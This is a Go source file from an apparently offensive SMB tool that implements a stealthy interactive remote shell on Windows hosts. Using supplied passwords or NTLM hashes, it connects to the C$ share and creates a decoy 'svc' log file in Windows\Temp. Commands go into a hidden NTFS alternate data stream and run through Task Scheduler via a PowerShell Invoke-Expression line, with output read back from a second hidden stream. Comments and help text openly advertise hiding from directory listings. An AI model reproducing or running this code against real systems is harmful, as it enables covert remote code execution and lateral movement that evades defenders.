package main

import (
	"context"
	"fmt"
	"io"
	"os"
	"strings"
	"time"

	"github.com/chzyer/readline"
	"github.com/ineffectivecoder/SMBGooser/pkg/smb"
	"github.com/ineffectivecoder/SMBGooser/pkg/smb/types"
	"github.com/ineffectivecoder/SMBGooser/pkg/tsch"
)

func init() {
	commands.Register(&Command{
		Name:        "ishell",
		Aliases:     []string{"shell"},
		Description: "Interactive shell via ADS + Task Scheduler",
		Usage:       "ishell",
		Handler:     cmdIShell,
	})
}

// cmdIShell provides an interactive shell using ADS for stealth
func cmdIShell(ctx context.Context, args []string) error {
	if client == nil || session == nil {
		return fmt.Errorf("not connected")
	}

	// Connect to C$ for ADS file operations
	info_("Connecting to C$ for ADS operations...")
	cTree, err := client.TreeConnect(ctx, "C$")
	if err != nil {
		return fmt.Errorf("failed to connect to C$: %w (required for ADS shell)", err)
	}
	defer client.TreeDisconnect(ctx, cTree)

	creds := tsch.Credentials{
		Username: currentUser,
		Password: currentPassword,
		Hash:     currentHash,
		Domain:   currentDomain,
	}

	// Generate unique base file name for this session
	baseFile := fmt.Sprintf("Windows\\Temp\\svc%d.log", time.Now().UnixNano()%1000000)
	adsCmd := baseFile + ":c" // Command stream
	adsOut := baseFile + ":o" // Output stream

	// Create the base file (empty)
	if err := createEmptyFile(ctx, cTree, baseFile); err != nil {
		return fmt.Errorf("failed to create base file: %w", err)
	}
	defer cleanupADSFile(ctx, cTree, baseFile)

	info_("ADS shell ready - commands hidden in %s", baseFile)
	info_("Type 'exit' or 'quit' to leave, 'help' for commands")
	fmt.Println()

	// Use readline for proper terminal handling
	shellPrompt := fmt.Sprintf("%sPS %s>%s ", colorCyan, targetHost, colorReset)
	rl, err := readline.NewEx(&readline.Config{
		Prompt:          shellPrompt,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",
		Stdin:           os.Stdin,
		Stdout:          os.Stdout,
		Stderr:          os.Stderr,
	})
	if err != nil {
		return fmt.Errorf("failed to initialize readline: %w", err)
	}
	defer rl.Close()

	for {
		input, err := rl.Readline()
		if err != nil {
			if err == readline.ErrInterrupt {
				continue
			}
			if err == io.EOF {
				break
			}
			break
		}

		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}

		// Handle shell meta-commands
		switch strings.ToLower(input) {
		case "exit", "quit":
			fmt.Println("Exiting shell...")
			return nil
		case "help":
			printIShellHelp()
			continue
		case "clear", "cls":
			fmt.Print("\033[H\033[2J")
			continue
		}

		// Execute command via ADS
		output, err := executeViaADS(ctx, cTree, creds, baseFile, adsCmd, adsOut, input)
		if err != nil {
			error_("Execution failed: %v", err)
			continue
		}

		if output != "" {
			fmt.Println(output)
		}
	}

	return nil
}

// createEmptyFile creates an empty file as the ADS base
func createEmptyFile(ctx context.Context, tree *smb.Tree, path string) error {
	file, err := tree.OpenFile(ctx, path, types.GenericWrite, types.FileCreate)
	if err != nil {
		// Try overwrite if exists
		file, err = tree.OpenFile(ctx, path, types.GenericWrite, types.FileOverwrite)
		if err != nil {
			return err
		}
	}
	return file.Close()
}

// cleanupADSFile deletes the base file and all its ADS
func cleanupADSFile(ctx context.Context, tree *smb.Tree, path string) {
	tree.DeleteFile(ctx, path)
}

// executeViaADS runs a command using ADS for input/output
func executeViaADS(ctx context.Context, tree *smb.Tree, creds tsch.Credentials,
	baseFile, adsCmd, adsOut, command string) (string, error) {

	// 1. Write command to :c stream
	if err := writeADSFile(ctx, tree, adsCmd, []byte(command)); err != nil {
		return "", fmt.Errorf("failed to write command: %w", err)
	}

	// 2. Build the PowerShell execution command
	// Reads command from :c stream, executes via PowerShell, outputs to :o stream
	fullPath := "C:\\" + strings.ReplaceAll(baseFile, "/", "\\")
	execCmd := fmt.Sprintf(
		`powershell.exe -NoProfile -NonInteractive -Command "$cmd = Get-Content '%s:c'; Invoke-Expression $cmd" > "%s:o" 2>&1`,
		fullPath, fullPath,
	)

	// 3. Execute via Task Scheduler
	tschClient, err := tsch.NewClient(ctx, client, creds)
	if err != nil {
		return "", fmt.Errorf("failed to create tsch client: %w", err)
	}
	defer tschClient.Close()

	if err := tschClient.Execute(execCmd); err != nil {
		return "", fmt.Errorf("execution failed: %w", err)
	}

	// 4. Wait for command to complete
	time.Sleep(800 * time.Millisecond)

	// 5. Read output from :o stream
	output, err := readADSFile(ctx, tree, adsOut)
	if err != nil {
		// Might be no output
		return "", nil
	}

	return strings.TrimSpace(string(output)), nil
}

// writeADSFile writes data to an alternate data stream
func writeADSFile(ctx context.Context, tree *smb.Tree, adsPath string, data []byte) error {
	file, err := tree.OpenFile(ctx, adsPath, types.GenericWrite, types.FileCreate)
	if err != nil {
		// Try overwrite
		file, err = tree.OpenFile(ctx, adsPath, types.GenericWrite, types.FileOverwrite)
		if err != nil {
			return err
		}
	}
	defer file.Close()

	_, err = file.Write(data)
	return err
}

// readADSFile reads data from an alternate data stream
func readADSFile(ctx context.Context, tree *smb.Tree, adsPath string) ([]byte, error) {
	file, err := tree.OpenFile(ctx, adsPath, types.GenericRead, types.FileOpen)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var result []byte
	buf := make([]byte, 4096)
	for {
		n, err := file.Read(buf)
		if n > 0 {
			result = append(result, buf[:n]...)
		}
		if err != nil {
			break
		}
	}
	return result, nil
}

func printIShellHelp() {
	fmt.Println("\n  ADS Interactive Shell:")
	fmt.Println("  " + strings.Repeat("-", 40))
	fmt.Println("  exit, quit  - Exit the shell")
	fmt.Println("  clear, cls  - Clear screen")
	fmt.Println("  help        - Show this help")
	fmt.Println()
	fmt.Println("  Commands are executed via Task Scheduler")
	fmt.Println("  I/O hidden in NTFS Alternate Data Streams")
	fmt.Println("  The base file appears empty in dir listings")
	fmt.Println()
}
